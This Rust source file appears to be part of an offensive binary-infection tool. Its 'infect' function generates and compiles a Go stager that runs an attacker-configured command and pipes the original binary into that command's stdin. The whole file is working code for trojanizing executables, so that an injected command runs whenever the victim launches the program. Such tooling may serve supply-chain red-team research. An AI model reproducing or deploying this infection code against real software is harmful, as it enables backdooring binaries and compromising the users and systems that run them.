use crate::codegen::go;
use crate::errors::*;
use crate::infect::elf_fwd_stdin::Infect;
use std::path::Path;

fn gen_args_src(args: &[String]) -> Result<String> {
    let mut s = String::new();
    for arg in args {
        s.push_str(", ");
        go::escape(arg.as_bytes(), &mut s)?;
    }
    Ok(s)
}

pub async fn infect(bin: &Path, src: &Path, config: &Infect, orig: &[u8]) -> Result<()> {
    let exec_path = config.exec_path();
    let args = config.args(exec_path);

    let mut compiler = go::Compiler::spawn(bin, src).await?;

    info!(
        "Generating stager for exec={:?}, argv[0]={:?}, args={:?}",
        exec_path,
        args[0],
        &args[1..],
    );

    let mut exec_path_escaped = String::new();
    go::escape(exec_path.as_bytes(), &mut exec_path_escaped)?;

    // argv0 is discarded when using the go codegen backend
    let args_src = gen_args_src(&args[1..])?;

    compiler
        .add_lines(&[
            "package main\n",
            "import (\n",
            "\"os/exec\"\n",
            ")\n",
            "func main() {\n",
            &format!("cmd := exec.Command(\"{exec_path_escaped}\" {args_src})\n"),
            "f, _ := cmd.StdinPipe()\n",
            "cmd.Start()\n",
        ])
        .await?;

    go::stream_bin(orig, &mut compiler.f).await?;

    compiler
        .add_lines(&["f.Close()\n", "cmd.Wait()\n", "}\n"])
        .await?;

    let mut pending = compiler.done()?;
    info!("Waiting for compile to finish...");
    pending.wait().await?;

    Ok(())
}
